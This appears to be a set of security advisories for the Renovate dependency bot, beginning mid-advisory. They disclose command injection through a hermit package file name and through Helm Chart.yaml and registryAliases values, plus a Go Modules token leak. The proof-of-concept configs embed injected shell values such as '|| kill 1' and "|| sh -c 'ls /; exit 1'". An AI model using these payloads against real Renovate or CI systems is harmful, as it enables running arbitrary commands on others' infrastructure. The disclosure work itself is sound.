`bin/.|| kill 1 ||@0.0.1.pkg` (symlink):

A symlink to `hermit`

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

> [!NOTE]
> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual hermit-packages repository during resolution.

### Impact
TThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

summary: Arbitrary command injection via helmv3 manager and malicious Chart.yaml file
description:
### Summary
The user-provided string `repository` in the `helmv3` manager is appended to the `helm registry login` command without proper sanitization.

### Details
Adversaries can provide a maliciously crafted `Chart.yaml` in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.
The value for both uses of the `repository` variable in [lib/modules/manager/helmv3/common.ts](https://github.com/renovatebot/renovate/blob/b69416ce1745f67c9fc1d149738e2f52feb4f732/lib/modules/manager/helmv3/common.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 31.51.0 (https://github.com/renovatebot/renovate/commit/f372a68144a4d78c9f7f418168e4efe03336a432), released on January 24 of 2022.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"99999.0.0"}]}'],
    },
  },
  // Register any credentials to make the manager attempt to use basic auth for the Helm registry
  hostRules: [
    {
      matchHost: "charts.bitnami.com",
      username: "un",
      password: "pw",
    },
  ],
  packageRules: [
    {
      // Target of the day
      matchManagers: ["helmv3"],
      // Don't consult the actual bitnami repo
      registryUrls: [],
      // But still, trick the manager in believing there's a new version
      overrideDatasource: "custom.always",
    },
  ],
}

```


`Chart.yaml`:

```yaml
apiVersion: v2
name: renovate-aci-1
version: 0.0.1
dependencies:
  - name: redis
    version: 0.1.0
    repository: oci://charts.bitnami.com/bitnami || kill 1

```


`Chart.lock`:

```yaml
dependencies:
- name: redis
  repository: oci://charts.bitnami.com/bitnami
```

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

> [!NOTE]
> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual Helm registry on the malformed repository URL.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

summary: Arbitrary command injection via helmv3 manager and registryAliases
description:
### Summary

Attackers with commit access to the default branch of a repo using Renovate could manipulate helmv3 registryAliases to execute arbitrary commands.

### Details

Since [#26848](https://github.com/renovatebot/renovate/pull/26848), `registryAliases` has become mergeable. This means that the helmv3 manager started honoring its value and uses a `helm repo add <key> <parameters>` command for each defined alias. See source code: https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80
The key was not quoted, leading to the ability to use variable references (`$FOO`) in it and have them printed by Renovate on the pull request, or even running any shell commands.

### PoC

Inside a repository where Renovate runs, add a Helm chart with an outdated dependency, for example:

test-chart/Chart.yaml:

```
apiVersion: v2
name: redis
version: 1.0.0
dependencies:
  - name: redis
    version: 18.13.10
    repository: oci://registry-1.docker.io/bitnamicharts
```

test-chart/Chart.lock:

```
dependencies:
- name: redis
  repository: oci://registry-1.docker.io/bitnamicharts
  version: 18.13.10
digest: sha256:11267bd32ea6c5c120ddebbb9f21e4a3c7700a961aa1a27ddb55df1fb8059a38
generated: "2024-02-16T13:31:20.807026334Z"
```

Then add the following `renovate.json`:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:base"
  ],
  "registryAliases": {
    "foo/bar || sh -c 'ls /; exit 1' >&2": "registry.example.com/proxy"
  }
}
```

Once Renovate runs on the repository, it will create a pull request, and add a comment titled "Artifact update problem" containing the following text:

```
File name: test-chart/Chart.lock

Command failed: helm repo add foo/bar || sh -c 'ls /; exit 1' >&2 registry.example.com/proxy --force-update
Error: "helm repo add" requires 2 arguments

Usage:  helm repo add [NAME] [URL] [flags]
bin
boot
dev
etc
go
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

This shows that the `ls` command executed successfully, and we can even see its output.

Note that redirecting any output you want to see to stderr (`>&2`) and making sure the final command fails (`exit 1`) is required in this case, as Renovate only adds a comment if the command fails, and it contains only stderr (not stdout) output.

### Impact

All Renovate versions from 37.158.0 up until 37.199.0 were affected. This vulnerability allows full access to Renovate's execution environment. The level of severity depends on how Renovate is deployed (Docker, Kubernetes, CI pipeline, ...) and whether Renovate is being offered to untrusted users/repositories.

summary: Go Modules Vulnerability Disclosure
description:
### Impact

Temporary repository tokens were leaked into Pull Requests comments in during certain Go Modules update failure scenarios.

### Patches

The problem has been patched. Self-hosted users should upgrade to v19.38.7 or later.

### Workarounds

Disable Go Modules support.

### References

Blog post: https://renovatebot.com/blog/go-modules-vulnerability-disclosure

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [Renovate](http://github.com/renovatebot/renovate)
